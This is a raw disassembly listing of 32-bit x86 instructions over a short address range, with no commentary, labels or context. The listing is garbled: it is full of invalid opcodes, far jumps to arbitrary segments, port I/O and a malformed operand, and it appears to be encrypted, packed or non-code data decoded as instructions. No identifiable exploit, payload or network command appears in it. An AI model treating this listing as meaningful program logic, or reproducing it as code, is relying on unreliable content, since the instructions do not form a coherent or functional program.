  41f31c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f31d:	sub    al,0xec
  41f31f:	mov    bl,0xbb
  41f321:	arpl   cx,ax
  41f323:	dec    ebp
  41f324:	xlat   BYTE PTR ds:[ebx]
  41f325:	fnsave [ecx]
  41f327:	test   DWORD PTR [ebx],eax
  41f329:	fldcw  WORD PTR [edi]
  41f32b:	xchg   DWORD PTR [edx-0x7b],ebx
  41f32e:	fadd   DWORD PTR [ecx+0x709326e3]
  41f334:	ror    BYTE PTR [edx],0x5e
  41f337:	popf   
  41f338:	ss js  0x41f345
  41f33b:	inc    eax
  41f33c:	jmp    0x7f7ef73b
  41f341:	or     bl,bl
  41f343:	fsubr  QWORD PTR [eax]
  41f345:	xor    ecx,edi
  41f347:	repnz test eax,0xf7c138dc
  41f34d:	test   eax,0xa71f186
  41f352:	or     ebp,edx
  41f354:	mov    BYTE PTR [ebp+0x5b6f148],ah
  41f35a:	cs jp  0x41f2e5
  41f35d:	or     BYTE PTR [esi+0x20f2cbe7],dl
  41f363:	sbb    BYTE PTR [edx+0x1e],ah
  41f366:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f367:	retf   
  41f368:	es std 
  41f36a:	cmp    eax,0xe43dec47
  41f36f:	(bad)  
  41f370:	pop    esp
  41f371:	fdiv   QWORD PTR [edi]
  41f373:	xchg   edx,eax
  41f374:	mov    edx,0xfa33cb0
  41f379:	and    DWORD PTR [ebp+eax*8+0xd99df1],edi
	...
  41f388:	add    BYTE PTR [eax],al
  41f38a:	add    BYTE PTR [eax],cl
  41f38c:	div    DWORD PTR [edi+0x4a]
  41f38f:	dec    edx
  41f391:	cmp    eax,0x2e8eedf7
  41f396:	dec    eax
  41f397:	sbb    dh,BYTE PTR [ebx-0x3e]
  41f39a:	(bad)  
  41f39b:	and    edx,DWORD PTR [ebp+0xac0001]
  41f3a1:	add    BYTE PTR [eax],al
  41f3a3:	lods   al,BYTE PTR ds:[esi]
  41f3a4:	xor    BYTE PTR [ecx],bh
  41f3a6:	sbb    al,0x31
  41f3a8:	fwait
  41f3a9:	shr    ebx,1
  41f3ab:	mov    dh,0xa6
  41f3ad:	div    BYTE PTR [ecx-0x1]
  41f3b0:	ss mov esi,0xd4c705d6
  41f3b6:	clc    
  41f3b7:	and    al,0xe9
  41f3b9:	data16 jo 0x41f42b
  41f3bc:	loop   0x41f361
  41f3be:	call   0x54e3:0x749535aa
  41f3c5:	dec    edx
  41f3c6:	and    BYTE PTR [ebx],0x35
  41f3c9:	xor    al,0xc2
  41f3cb:	add    bl,BYTE PTR [eax]
  41f3cd:	retf   
  41f3ce:	mov    DWORD PTR [ecx],esp
  41f3d0:	mov    bh,0x81
  41f3d2:	mov    ss,WORD PTR [esi]
  41f3d4:	dec    ebp
  41f3d5:	or     BYTE PTR [esi],0xd1
  41f3d8:	nop
  41f3d9:	stos   BYTE PTR es:[edi],al
  41f3da:	mov    ds:0xd3110ca8,al
  41f3df:	in     eax,dx
  41f3e0:	ja     0x41f3ae
  41f3e2:	adc    eax,0x1cb3a1d3
  41f3e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3e8:	adc    BYTE PTR [edi-0x3f],cl
  41f3eb:	call   0x8f9:0x8807711
  41f3f2:	jmp    0xc21e82a4
  41f3f7:	clc    
  41f3f8:	jno    0x41f399
  41f3fa:	aad    0xb9
  41f3fc:	inc    ecx
  41f3fd:	and    edi,esp
  41f3ff:	jne    0x41f471
  41f401:	xor    ah,bh
  41f403:	pop    es
  41f404:	(bad)  
  41f405:	fadd   DWORD PTR [esi+0x79]
  41f408:	rcl    DWORD PTR [ecx],1
  41f40a:	xor    ch,BYTE PTR [ecx]
  41f40c:	aas    
  41f40d:	imul   esi,ebx,0xe844f0d6
  41f413:	jp     0x41f405
  41f415:	test   BYTE PTR [edx+0x27],bh
  41f418:	sar    dh,0x2e
  41f41b:	in     al,dx
  41f41c:	ins    DWORD PTR es:[edi],dx
  41f41d:	sbb    ah,BYTE PTR [edi]
  41f41f:	(bad)  
  41f420:	fs std 
  41f422:	jne    0x41f44d
  41f424:	adc    DWORD PTR [ebp+ecx*2+0x3],ecx
  41f428:	dec    esp
  41f429:	mov    eax,ds:0x1b4fed2c
  41f42e:	std    
  41f42f:	push   ebx
  41f430:	add    ecx,eax
  41f432:	xor    BYTE PTR ds:[esi],ch
  41f435:	popa   
  41f436:	inc    ebx
  41f437:	dec    esp
  41f438:	cmp    edx,DWORD PTR [edx]
  41f43a:	les    eax,FWORD PTR [ecx-0x7855bf03]
  41f440:	jmp    0x706e:0xb2a94cb2
  41f447:	jle    0x41f402
  41f449:	pop    esi
  41f44a:	aas    
  41f44b:	and    al,0xec
  41f44d:	scas   eax,DWORD PTR es:[edi]
  41f44e:	cmp    BYTE PTR [eax],al
	...
  41f458:	add    BYTE PTR [eax],al
  41f45a:	add    BYTE PTR [esi],dh
  41f45c:	arpl   WORD PTR [eax-0x10],bp
  41f45f:	jge    0x41f45c
  41f461:	mov    esi,0x8c7853e7
  41f466:	daa    
  41f467:	ins    BYTE PTR es:[edi],dx
  41f468:	rcl    BYTE PTR [ebx+edx*2+0x195cf],cl
  41f46f:	lods   al,BYTE PTR ds:[esi]
  41f470:	add    BYTE PTR [eax],al
  41f472:	add    BYTE PTR [esi],bh
  41f474:	cmc    
  41f475:	fnstenv [edx+0x642c9640]
  41f47b:	je     0x41f410
  41f47d:	pop    edi
  41f47e:	adc    DWORD PTR es:0x2b8cea23,0x1dc2eb1a
  41f489:	xchg   edi,eax
  41f48a:	scas   al,BYTE PTR es:[edi]
  41f48b:	jmp    0xd058ef0
  41f490:	test   DWORD PTR [eax+eiz*2],ecx
  41f493:	add    eax,0x47558e2c
  41f498:	ror    BYTE PTR [edi],cl
  41f49a:	inc    esp
  41f49b:	in     al,dx
  41f49c:	sbb    BYTE PTR [edi],ah
  41f49e:	mov    edi,0x1beaa253
  41f4a3:	sbb    dh,ch
  41f4a5:	stc    
  41f4a6:	pop    esp
  41f4a7:	mov    bh,0x27
  41f4a9:	pusha  
  41f4aa:	adc    al,0x53
  41f4ac:	in     eax,0x21
  41f4ae:	pop    ds
  41f4af:	lds    eax,FWORD PTR [eax]
  41f4b1:	pushf  
  41f4b2:	jmp    0xed88:0x569c7fae
  41f4b9:	pop    ss
  41f4ba:	aas    
  41f4bb:	sbb    DWORD PTR [ebx],ebx
  41f4bd:	pusha  
  41f4be:	nop
  41f4bf:	fdivr  st(3),st
  41f4c1:	fld    QWORD PTR [ebx]
  41f4c3:	adc    DWORD PTR [edi],eax
  41f4c5:	sbb    ecx,DWORD PTR [ebx]
  41f4c7:	ror    BYTE PTR [eax],cl
  41f4c9:	retf   0x2bd8
  41f4cc:	ficom  WORD PTR [eax]
  41f4ce:	add    al,0x2a
  41f4d0:	in     al,0x9f
  41f4d2:	adc    DWORD PTR [edx-0x71787916],edi
  41f4d8:	jae    0x41f546
  41f4da:	adc    eax,0xf355784d
  41f4df:	and    al,BYTE PTR [esi+eiz*4-0x33afa4f4]
  41f4e6:	enter  0xa78b,0xb0
  41f4ea:	xchg   edx,eax
  41f4eb:	popa   
  41f4ec:	and    bh,dh
  41f4ee:	inc    ebp
  41f4ef:	and    DWORD PTR [edx-0x11],edi
  41f4f2:	lock jnp 0x41f4f9
  41f4f5:	and    ah,BYTE PTR [ebx+0x2a4e8d9c]
  41f4fb:	dec    esp
  41f4fc:	xchg   ebx,eax
  41f4fd:	and    dl,BYTE PTR [ecx-0x55]
  41f500:	jbe    0x41f499
  41f502:	das    
  41f503:	mov    WORD PTR [edi],ds
  41f505:	out    0x3e,eax
  41f507:	push   ecx
  41f508:	push   ss
  41f509:	jmp    0x2a18:0xef7d5822
  41f510:	aas    
  41f511:	popa   
  41f512:	adc    DWORD PTR [eax+ecx*4-0x6a],ebx
  41f516:	inc    eax
  41f517:	pop    ebp
  41f518:	test   al,0x22
  41f51a:	aaa    
  41f51b:	retf   
  41f51c:	push   es
  41f51d:	(bad)  
  41f51e:	push   esi
	...
  41f52b:	daa    
  41f52c:	ss lahf 
  41f52e:	xor    DWORD PTR [edi+0x1536afb9],ebx
  41f534:	and    eax,0xdf9d075b
  41f539:	dec    ebx
  41f53a:	(bad)  
  41f53c:	mov    ds:0xac0001,eax
  41f541:	add    BYTE PTR [eax],al
  41f543:	push   ebx
  41f544:	into   
  41f545:	popf   
  41f546:	mov    ds:0x6c2396ad,eax
  41f54b:	sub    al,0xa9
  41f54d:	or     al,0x62
  41f54f:	arpl   WORD PTR [eax],cx
  41f551:	lea    edi,[edi]
  41f553:	arpl   WORD PTR [ecx+ecx*1-0x39],bx
  41f557:	ins    DWORD PTR es:[edi],dx
  41f558:	(bad)  
  41f559:	nop
  41f55a:	mov    edx,ebp
  41f55c:	call   0x8c1d:0x38472fe0
  41f563:	out    dx,eax
  41f564:	(bad)  
  41f565:	mov    ch,0x24
  41f567:	frstor [ebx-0x72]
  41f56a:	imul   edx,DWORD PTR ds:0x6e5c5081,0x4844f4e2
  41f574:	mov    bh,0x61
  41f576:	push   ss
  41f577:	les    ecx,FWORD PTR [edi-0x4c]
  41f57a:	daa    
  41f57b:	mov    ebp,0x1083fb9e
  41f580:	lock retf 0x194b
  41f584:	lds    edi,FWORD PTR [eax-0x1c7b8391]
  41f58a:	imul   eax,DWORD PTR [ecx-0x5b],0x197d507
  41f591:	gs jecxz 0x41f5f4
  41f594:	xchg   esp,eax
  41f595:	out    0xf3,eax
  41f597:	push   es
  41f598:	add    al,BYTE PTR [edi-0x60]
  41f59b:	ror    BYTE PTR [edi],0x0
  41f59e:	sti    
  41f59f:	(bad)  
  41f5a0:	sbb    edx,DWORD PTR [ecx+0x47213a3f]
  41f5a6:	adc    BYTE PTR [esi*4+0x4bc7ac8b],al
  41f5ad:	clc    
  41f5ae:	cmp    edx,DWORD PTR [ecx]
  41f5b0:	frstor [edx]
  41f5b2:	push   ss
  41f5b3:	mov    cl,BYTE PTR [edx+esi*4-0xd]
  41f5b7:	inc    ecx
  41f5b8:	add    DWORD PTR ds:0xfe37ec45,0x31
  41f5bf:	push   ss
  41f5c0:	mov    ah,0x42
  41f5c2:	(bad)  
  41f5c3:	fwait
  41f5c4:	inc    edx
  41f5c5:	hlt    
  41f5c6:	arpl   WORD PTR [edi],bx
  41f5c8:	ret    
  41f5c9:	shl    DWORD PTR [ecx-0x4e60a9c8],cl
  41f5cf:	and    edi,DWORD PTR [ecx]
  41f5d1:	fdivr  st,st(3)
  41f5d3:	push   0x33
  41f5d5:	ss ins DWORD PTR es:[edi],dx
  41f5d7:	mov    BYTE PTR [ebx-0x44],dl
  41f5da:	add    DWORD PTR [edi-0x3b],edi
  41f5dd:	rcr    DWORD PTR [ecx-0x69],cl
  41f5e0:	pop    eax
  41f5e1:	mov    esi,0xcc6e4c2
  41f5e6:	retf   0xfda4
  41f5e9:	xor    al,0x44
  41f5eb:	pop    ebx
  41f5ec:	loop   0x41f5d7
  41f5ee:	jbe    0x41f5f0
	...
  41f5f8:	add    BYTE PTR [eax],al
  41f5fa:	add    BYTE PTR [edi],dh
  41f5fc:	(bad)  
  41f5fd:	out    0xc2,eax
  41f5ff:	mul    ebx
  41f601:	aaa    
  41f602:	cmc    
  41f603:	xchg   ecx,eax
  41f604:	call   0xc1f6:0x4d20eef4
  41f60b:	jmp    0x41f5b0
  41f60d:	add    DWORD PTR [eax],eax
  41f60f:	lods   al,BYTE PTR ds:[esi]
  41f610:	add    BYTE PTR [eax],al
  41f612:	add    BYTE PTR [ebx],bh
  41f614:	mov    ecx,0x842821f6
  41f619:	retf   0xc9fb
  41f61c:	inc    eax
  41f61d:	arpl   WORD PTR ds:[edi],ax
  41f620:	and    DWORD PTR [ebp+0x367237f5],ebp
  41f626:	sub    al,0x69
  41f628:	or     al,0xd6
  41f62a:	gs dec esi
  41f62c:	imul   eax,edx,0x5c
  41f62f:	out    0x59,al
  41f631:	mov    ecx,0x97c544aa
  41f636:	mov    ah,0xa2
  41f638:	pop    ebx
  41f639:	fidivr DWORD PTR [ecx+ebx*2-0x6a1b8c5a]
  41f640:	out    dx,eax
  41f641:	mov    ds:0x76c05159,eax
  41f646:	int3   
  41f647:	cdq    
  41f648:	lods   eax,DWORD PTR ds:[esi]
  41f649:	fimul  WORD PTR [ecx+0x60]
  41f64c:	mov    cl,0xfa
  41f64e:	push   es
  41f64f:	sbb    eax,edi
  41f651:	xlat   BYTE PTR ds:[ebx]
  41f652:	outs   dx,DWORD PTR ds:[esi]
  41f653:	(bad)  
  41f654:	mov    bl,0xf7
  41f656:	out    0x9e,eax
  41f658:	out    0xe9,al
  41f65a:	daa    
  41f65b:	out    0x2e,al
  41f65d:	cs cdq 
  41f65f:	or     eax,0xfef613fd
  41f664:	call   0xf86e480d
  41f669:	rcl    BYTE PTR fs:[edi-0x4f75ecf],cl
  41f670:	sub    eax,0xf8c3f781
  41f675:	dec    edi
  41f676:	test   bl,ah
  41f678:	ds jne 0x41f661
  41f67b:	pop    es
  41f67c:	jno    0x41f6aa
  41f67e:	mov    BYTE PTR [edi+0x0],bh
  41f681:	jmp    0x5942:0x502e53ac
  41f688:	test   BYTE PTR [ecx+0x1],ah
  41f68b:	xor    BYTE PTR [ebx+0x5c13368c],dh
  41f691:	push   esp
  41f692:	jo     0x41f61e
  41f694:	aam    0x96
  41f696:	lods   al,BYTE PTR ds:[esi]
  41f697:	xor    al,0xc6
  41f699:	cld    
  41f69a:	mov    BYTE PTR [esi-0x3c],ch
  41f69d:	dec    ecx
  41f69e:	xchg   DWORD PTR fs:[edi],edx
  41f6a1:	sbb    ecx,edx
  41f6a3:	pop    ebx
  41f6a4:	fsubp  st(6),st
  41f6a6:	mov    bl,BYTE PTR [bx+si-0x6f]
  41f6aa:	into   
  41f6ab:	shl    BYTE PTR [ebx-0x15c36971],0xb1
  41f6b2:	sahf   
  41f6b3:	jg     0x41f6f2
  41f6b5:	shr    dh,1
  41f6b7:	das    
  41f6b8:	xchg   ebx,eax
  41f6b9:	test   eax,0x6279a6e8
  41f6be:	sbb    al,BYTE PTR [eax]
	...
  41f6c8:	add    BYTE PTR [eax],al
  41f6ca:	add    BYTE PTR [esi],dl
  41f6cc:	aad    0xdf
  41f6ce:	out    dx,eax
  41f6cf:	fucomip st,st(7)
  41f6d1:	ss std 
  41f6d3:	cmp    BYTE PTR [esi+0x5fa45f3a],al
  41f6d9:	in     al,dx
  41f6da:	out    dx,eax
  41f6db:	xchg   edi,eax
  41f6dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f6dd:	add    DWORD PTR [eax],eax
  41f6df:	lods   al,BYTE PTR ds:[esi]
  41f6e0:	add    BYTE PTR [eax],al
  41f6e2:	add    al,bh
  41f6e4:	sub    BYTE PTR [edi+0x6c],cl
  41f6e7:	xchg   esp,eax
  41f6e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6e9:	(bad)  
  41f6ea:	jge    0x41f6b9
  41f6ec:	bswap  edx
  41f6ee:	mov    DWORD PTR [edi],ebx
  41f6f0:	test   al,0x78
  41f6f2:	mov    ebp,edi
  41f6f4:	mul    BYTE PTR ds:0x8b36ab0e
  41f6fa:	and    DWORD PTR [ecx+edx*2],0x13
  41f6fe:	mov    esi,0x54e0c58e
  41f703:	imul   ebx,DWORD PTR [edx+0x3e1e5689],0x2a
  41f70a:	popa   
  41f70b:	js     0x41f6cc
  41f70d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f70e:	fst    st(1)
  41f710:	test   DWORD PTR [eax+0x6e],esp
  41f713:	or     ebp,edx
  41f715:	jnp    0x41f6cc
  41f717:	ror    DWORD PTR ss:[eax-0xa7ab06d],0x7a
  41f71f:	mov    esp,0x25d7ac6a
  41f724:	add    edi,DWORD PTR [ebp-0x7b]
  41f727:	cmp    DWORD PTR [ebp+0x45],0xffffff95
  41f72b:	mov    ds:0x13dbe355,al
  41f730:	popa   
  41f731:	pop    DWORD PTR [edi-0x458f74fa]
  41f737:	add    ebx,DWORD PTR [esi-0x3f0212e2]
  41f73d:	stc    
  41f73e:	push   esi
  41f73f:	xchg   ebx,eax
  41f740:	or     DWORD PTR [esi-0x5ea301e0],edx
  41f746:	sub    BYTE PTR [eax+0x44],0x30
  41f74a:	push   ecx
  41f74b:	xchg   ebx,eax
  41f74c:	fistp  DWORD PTR [edx-0x6f022d35]
  41f752:	push   eax
  41f753:	pusha  
  41f754:	(bad)  
  41f755:	mov    WORD PTR [edi-0x2fe2ce],es
  41f75b:	test   eax,eax
  41f75d:	rol    BYTE PTR [esi+0x0],0x5e
  41f761:	add    cl,BYTE PTR [edi-0x4adcc8bb]
  41f767:	scas   al,BYTE PTR es:[edi]
  41f768:	das    
  41f769:	pop    esi
  41f76a:	imul   edi,DWORD PTR [edx],0x26
  41f76d:	xchg   edi,eax
  41f76e:	xchg   edi,eax
  41f76f:	bound  edx,QWORD PTR ds:0xd002e4bc
  41f775:	add    edx,DWORD PTR [ebx]
  41f777:	cmp    eax,0x79514bb1
  41f77c:	jns    0x41f7b1
  41f77e:	int    0x31
  41f780:	push   esp
  41f781:	cdq    
  41f782:	xchg   ebp,eax
  41f783:	sbb    eax,0x487ae9a0
  41f788:	xor    al,0xb
  41f78a:	mov    WORD PTR [ecx+0x6b],?
  41f78d:	pusha  
  41f78e:	adc    al,BYTE PTR [eax]
	...
  41f798:	add    BYTE PTR [eax],al
  41f79a:	add    BYTE PTR [esi+0x76],ch
  41f79d:	in     al,0xca
  41f79f:	cld    
  41f7a0:	fisubr DWORD PTR [esi-0xa]
  41f7a3:	sbb    BYTE PTR [edx+0x3bf19787],dl
  41f7a9:	stc    
  41f7aa:	stos   DWORD PTR es:[edi],eax
  41f7ab:	inc    ebx
  41f7ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f7ad:	add    DWORD PTR [eax],eax
  41f7af:	lods   al,BYTE PTR ds:[esi]
  41f7b0:	add    BYTE PTR [eax],al
  41f7b2:	add    BYTE PTR [edi+0x51],bh
  41f7b5:	aad    0xb0
  41f7b7:	xchg   ebp,eax
  41f7b8:	out    dx,eax
  41f7b9:	inc    edi
  41f7ba:	or     al,0x10
  41f7bc:	lahf   
  41f7bd:	bound  esi,QWORD PTR [edx+0x71ddbd8c]
  41f7c3:	xchg   BYTE PTR [ecx],ch
  41f7c5:	sbb    eax,0x49c5b592
  41f7ca:	lods   eax,DWORD PTR ds:[esi]
  41f7cb:	mov    ebx,0x9a12074e
  41f7d0:	mov    dh,0xe3
  41f7d2:	nop
  41f7d3:	dec    ebp
  41f7d5:	add    bh,BYTE PTR [ebx+ecx*4]
  41f7d8:	add    al,0xba
  41f7da:	cli    
  41f7db:	xchg   edi,eax
  41f7dc:	mov    ebp,eax
  41f7de:	push   esp
  41f7df:	jo     0x41f78d
  41f7e1:	or     eax,0x29471e0c
  41f7e6:	cmp    esi,DWORD PTR [ecx]
  41f7e8:	lds    ebx,FWORD PTR ds:0x30f4b360
  41f7ee:	mov    edi,0xe560eb2c
  41f7f3:	sub    al,0x8d
  41f7f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7f6:	bound  ebp,QWORD PTR [esi+0x11]
  41f7f9:	ins    BYTE PTR es:[edi],dx
  41f7fa:	xchg   edx,eax
  41f7fb:	ret    0x1774
  41f7fe:	fcmovbe st,st(7)
  41f800:	pop    esp
  41f801:	mov    esi,0x31d5a174
  41f806:	rcl    bl,1
  41f808:	push   ds
  41f809:	in     eax,dx
  41f80a:	rcr    DWORD PTR [ebx],0x43
  41f80d:	cmp    ebx,DWORD PTR [ebp-0x3034542]
  41f813:	push   esi
  41f814:	push   ebp
  41f815:	repz das 
  41f817:	xchg   ebx,eax
  41f818:	in     al,dx
  41f819:	adc    al,BYTE PTR ds:0x8eb037e7
  41f81f:	pop    esi
  41f820:	mov    dh,0xbd
  41f822:	fs sbb al,0x92
  41f825:	out    dx,al
  41f826:	jge    0x41f867
  41f828:	or     al,0xa3
  41f82a:	aas    
  41f82b:	jle    0x41f80e
  41f82d:	jmp    FWORD PTR [edx+eiz*8+0x6217cc7f]
  41f834:	std    
  41f835:	dec    esi
  41f836:	mov    ds:0x8895c265,al
  41f83b:	iret   
  41f83c:	call   FWORD PTR [eax+0x7f]
  41f83f:	push   esi
  41f840:	dec    eax
  41f841:	loope  0x41f7f0
  41f843:	aas    
  41f844:	push   ebp
  41f845:	push   ss
  41f846:	(bad)  
  41f848:	jo     0x41f8a3
  41f84a:	push   esi
  41f84b:	cli    
  41f84c:	sbb    dh,dh
  41f84e:	lods   eax,DWORD PTR ds:[esi]
  41f84f:	mov    eax,0xc7bcfe28
  41f854:	pop    esi
  41f855:	lds    ebp,FWORD PTR [eax+0x3404be83]
  41f85b:	sbb    eax,0xa09021
	...
  41f868:	add    BYTE PTR [eax],al
  41f86a:	add    BYTE PTR [edx],bh
  41f86c:	push   edx
  41f86d:	les    ecx,FWORD PTR [edi]
  41f86f:	in     al,dx
  41f870:	lahf   
  41f871:	sti    
  41f872:	ja     0x41f86a
  41f874:	rcl    DWORD PTR [eax-0x403fb82d],1
  41f87a:	sub    bh,0xa5
  41f87d:	add    DWORD PTR [eax],eax
  41f87f:	lods   al,BYTE PTR ds:[esi]
  41f880:	add    BYTE PTR [eax],al
  41f882:	add    BYTE PTR [eax],dh
  41f884:	addr16 jmp 0x6743:0x6ce0f538
  41f88c:	fist   WORD PTR [eax+edx*4-0x20]
  41f890:	jb     0x41f83f
  41f892:	ss mov bh,0x61
  41f895:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f896:	sbb    DWORD PTR [edi],0xfafc81d7
  41f89c:	fdivr  st,st(0)
  41f89e:	ss out 0x61,eax
  41f8a1:	clc    
  41f8a2:	enter  0x1db0,0xac
  41f8a6:	shr    BYTE PTR [edx+0x24],cl
  41f8a9:	mov    al,ds:0xefa74830
  41f8ae:	fcom   st(6)
  41f8b0:	fstp   DWORD PTR [ebp+0x22]
  41f8b3:	call   0x252f:0x71e6e456
  41f8ba:	jmp    0xf6b66a77
  41f8bf:	or     al,0x3c
  41f8c1:	sbb    DWORD PTR [edx-0x27591892],ecx
  41f8c7:	adc    DWORD PTR [edi+0x2c4e2376],ebx
  41f8cd:	mov    edx,0xe4704b66
  41f8d2:	mov    edx,0x8b128c00
  41f8d7:	mov    al,ds:0x6479c93e
  41f8dc:	sbb    al,0x8c
  41f8de:	lds    esi,FWORD PTR [edi+eiz*8+0x3d5609c0]
  41f8e5:	mov    edx,0x6e75d0f0
  41f8ea:	jb     0x41f8dd
  41f8ec:	xchg   edx,eax
  41f8ed:	cli    
  41f8ee:	push   ebx
  41f8ef:	add    al,0x3d
  41f8f1:	dec    edi
  41f8f2:	sub    esi,edx
  41f8f4:	in     eax,0x90
  41f8f6:	(bad)  
  41f8f7:	(bad)  
  41f8f8:	jno    0x41f935
  41f8fa:	enter  0xbdcb,0x28
  41f8fe:	lods   al,BYTE PTR ds:[esi]
  41f8ff:	je     0x41f8dc
  41f901:	xor    eax,0x535bfa13
  41f906:	mov    esi,0x9fd2ec5d
  41f90b:	push   bp
  41f90d:	jno    0x41f939
  41f90f:	push   edx
  41f910:	mov    ah,0xd1
  41f912:	jl     0x41f8d3
  41f914:	xchg   edi,ebx
  41f916:	ficom  DWORD PTR [edi+ebp*8+0x37]
  41f91a:	cli    
  41f91b:	sbb    BYTE PTR [edx+ecx*4],cl
  41f91e:	xlat   BYTE PTR ds:[ebx]
  41f91f:	mov    ds:0x6cc39288,al
  41f924:	js     0x41f941
  41f926:	scas   al,BYTE PTR es:[edi]
  41f927:	sub    al,0xde
  41f929:	iret   
  41f92a:	add    DWORD PTR [eax],esp
  41f92c:	jae    0x41f8dc
  41f92e:	mov    es,WORD PTR [eax]
	...
  41f938:	add    BYTE PTR [eax],al
  41f93a:	add    BYTE PTR [ebx-0x4293427d],dl
  41f940:	jle    0x41f915
  41f942:	call   DWORD PTR [eax-0x20]
  41f945:	cli    
  41f946:	call   0xa69b:0x14c1e678
  41f94d:	add    DWORD PTR [eax],eax
  41f94f:	lods   al,BYTE PTR ds:[esi]
  41f950:	add    BYTE PTR [eax],al
  41f952:	add    BYTE PTR [ebp+0x3663fce2],dl
  41f958:	data16 hlt 
  41f95a:	and    bh,BYTE PTR [eax+0x1b]
  41f95d:	inc    esi
  41f95e:	out    0x70,eax
  41f960:	popa   
  41f961:	ja     0x41f932
  41f963:	mov    eax,ds:0x1a2da83e
  41f968:	dec    edi
  41f969:	lock pop ebp
  41f96b:	div    BYTE PTR [ecx]
  41f96d:	cmp    ebp,DWORD PTR [ebp-0x2b391c49]
  41f973:	imul   esp,DWORD PTR [edx+0x11],0xffffffe2
  41f977:	jecxz  0x41f952
  41f979:	push   esi
  41f97a:	out    0xea,eax
  41f97c:	aam    0x43
  41f97e:	lds    ebx,FWORD PTR [ebx]
  41f980:	mov    dl,BYTE PTR fs:[ecx+0x58]
  41f984:	ret    0xb888
  41f987:	es out dx,eax
  41f989:	mov    ah,0xe0
  41f98b:	pushf  
  41f98c:	mov    ecx,eax
  41f98e:	test   eax,0xf18728b7
  41f993:	pop    ecx
  41f994:	dec    edx
  41f995:	imul   ebx,DWORD PTR [ebx-0x45],0x2b
  41f999:	inc    edx
  41f99a:	rcl    al,cl
  41f99c:	aas    
  41f99d:	jmp    0x516b:0xe38dbf7c
  41f9a4:	dec    ebp
  41f9a5:	inc    esp
  41f9a6:	repnz mov ds,WORD PTR [eax+0x64]
  41f9aa:	inc    esi
  41f9ab:	jae    0x41f939
  41f9ad:	xor    DWORD PTR [ecx+eiz*2-0x58],0xffffffc3
  41f9b2:	pop    ds
  41f9b3:	inc    eax
  41f9b4:	push   ebp
  41f9b5:	fistp  QWORD PTR [esi+0x1d4cf17a]
  41f9bb:	push   edx
  41f9bc:	mov    ecx,0x62ae7869
  41f9c1:	bound  esp,QWORD PTR [ebx+0x3422a5ee]
  41f9c7:	adc    al,0xa4
  41f9c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f9ca:	nop
  41f9cb:	jno    0x41f9e2
  41f9cd:	xor    DWORD PTR [edi],ebp
  41f9cf:	jg     0x41f965
  41f9d1:	mov    edx,0xf87be3e0
  41f9d6:	adc    al,0x9c
  41f9d8:	aas    
  41f9d9:	hlt    
  41f9da:	add    ah,cl
  41f9dc:	data16 mul BYTE PTR [edi+0xd]
  41f9e0:	xchg   esp,eax
  41f9e1:	or     DWORD PTR [ecx],edi
  41f9e3:	pop    esp
  41f9e4:	scas   eax,DWORD PTR es:[edi]
  41f9e5:	out    dx,eax
  41f9e6:	add    esi,edx
  41f9e8:	xor    edi,DWORD PTR [edx-0x4b110808]
  41f9ee:	(bad)  
  41f9ef:	and    BYTE PTR [ebp+0x48],ah
  41f9f2:	jae    0x41fa33
  41f9f4:	out    0xb5,eax
  41f9f6:	test   esi,ebx
  41f9f8:	sub    ah,BYTE PTR [edx-0x7d]
  41f9fb:	sbb    DWORD PTR [ebx-0x16],edx
  41f9fe:	test   BYTE PTR [eax],0x0
	...
  41fa09:	add    BYTE PTR [eax],al
  41fa0b:	(bad)  
  41fa0d:	test   eax,0xddffeef7
  41fa13:	and    al,0x1
  41fa15:	pop    ebp
  41fa16:	dec    edi
  41fa17:	stos   DWORD PTR es:[edi],eax
  41fa18:	rcl    BYTE PTR [ebx+eax*2+0x47],1
  41fa1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa1d:	add    DWORD PTR [eax],eax
  41fa1f:	lods   al,BYTE PTR ds:[esi]
  41fa20:	add    BYTE PTR [eax],al
  41fa22:	add    BYTE PTR [edi],cl
  41fa24:	jnp    0x41fa2c
  41fa26:	mov    ah,0x27
  41fa28:	fbld   TBYTE PTR [ebp-0x2d2c8f01]
  41fa2e:	stos   DWORD PTR es:[edi],eax
  41fa2f:	inc    esp
  41fa30:	xchg   esi,eax
  41fa31:	push   ds
  41fa32:	jns    0x41fa3a
  41fa34:	sahf   
  41fa35:	mov    fs,WORD PTR [ebx+edi*4-0x50948977]
  41fa3c:	je     0x41fa43
  41fa3e:	call   0x1b25a5b6
  41fa43:	dec    edx
  41fa44:	inc    eax
  41fa45:	scas   al,BYTE PTR es:[edi]
  41fa46:	dec    ecx
  41fa47:	test   eax,edx
  41fa49:	pop    edx
  41fa4a:	cwde   
  41fa4b:	cmp    eax,0x6a2fe7a
  41fa50:	mov    ah,0x30
  41fa52:	mov    ebp,0xd524daad
  41fa57:	pop    ebx
  41fa58:	cdq    
  41fa59:	mov    ecx,0xfe7df370
  41fa5e:	adc    edx,DWORD PTR [edi+ebp*2+0x5a]
  41fa62:	test   WORD PTR [ecx+0x48b14614],bx
  41fa69:	gs jae 0x41fa81
  41fa6c:	out    0xbe,al
  41fa6e:	xor    esp,0x943625bc
  41fa74:	not    ebx
  41fa76:	out    0x34,al
  41fa78:	jb     0x41faa2
  41fa7a:	div    BYTE PTR [esi]
  41fa7c:	hlt    
  41fa7d:	iret   
  41fa7e:	je     0x41fadb
  41fa80:	inc    esi
  41fa81:	and    cl,BYTE PTR [ecx+0x1d]
  41fa84:	fnstenv [ebx-0x5f]
  41fa87:	les    ebp,FWORD PTR [edx]
  41fa89:	mov    ecx,0x6505f036
  41fa8e:	add    BYTE PTR [ebp-0x58fa09a8],cl
  41fa94:	stc    
  41fa95:	mov    esp,0x2664b72e
  41fa9a:	mov    eax,ds:0x6bc0f646
  41fa9f:	adc    eax,0x67362b21
  41faa4:	jmp    DWORD PTR [esi]
  41faa6:	cmp    eax,0xd4af442
  41faab:	add    dh,al
  41faad:	int    0x47
  41faaf:	sar    BYTE PTR [esi+0x1dedd538],0xd0
